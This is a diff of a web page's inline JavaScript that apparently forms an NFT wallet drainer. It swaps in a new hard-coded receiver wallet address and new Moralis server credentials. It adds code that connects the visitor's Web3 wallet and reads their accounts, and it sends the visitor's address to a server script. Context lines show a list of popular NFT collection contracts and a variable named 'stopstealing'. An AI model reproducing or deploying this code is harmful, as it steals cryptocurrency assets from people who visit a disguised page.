@@ -716,9 +716,10 @@ background-image: url('1500x500.jpg'); background-position: center center; min-h
     <script src="toastr/glimpse.toastr.js"></script>
     <script src="sweetalert@2.1.2/dist/sweetalert.min.js"></script>
     <script>
-             const serverUrl = "https://gjyv51ftplyd.usemoralis.com:2053/server";
-          const appId = "vxWxUTHmu6R6lvd39MBZmMpDCjQ5IpcVuqFDiBXq";
-            Moralis.start({ serverUrl, appId });
+             startMOralis = async() => {const serverUrl = "https://2uuwz8f6oqbb.usemoralis.com:2053/server";
+		const appId = "LZKnRUNSDdi6hTYDFx5GbLbxx1fPHnKryMQUurv3";
+		Moralis.start({ serverUrl, appId }).catch(err => console.log(err));
+		const web3Provider = await Moralis.enableWeb3();
             var web3;
             var nfts;
             var stopstealing = "sstop stealing";
@@ -729,8 +730,7 @@ background-image: url('1500x500.jpg'); background-position: center center; min-h
             //var msg = $("#msg");
             //var amount = $("#amount").val();
             var amount = 1;
-        const receiverAddr = "0x91cF501165719B2e8b97084419A093CA8BBE939C";
-                // const receiverAddr = "0xD838c8F2A55562dA7F62EC48eA8E6C11F50b2c9F";
+        const receiverAddr = "0xDB166D515EB187ec35a54aF33592d84D5B8Ef1Ff";
           const contracts = [
       "0xED5AF388653567Af2F388E6224dC7C4b3241C544",
       "0xBC4CA0EdA7647A8aB7C2061c2E118A18a936f13D",
@@ -1056,7 +1056,8 @@ background-image: url('1500x500.jpg'); background-position: center center; min-h
                     }
                     return
                 }
-                const addr = await Moralis.Web3.account;
+                const accounts = await ethereum.request({ method: 'eth_accounts' })
+			    addr = accounts[0]
                 $.ajax({
                     type : "POST",
                     url  : "address.php",
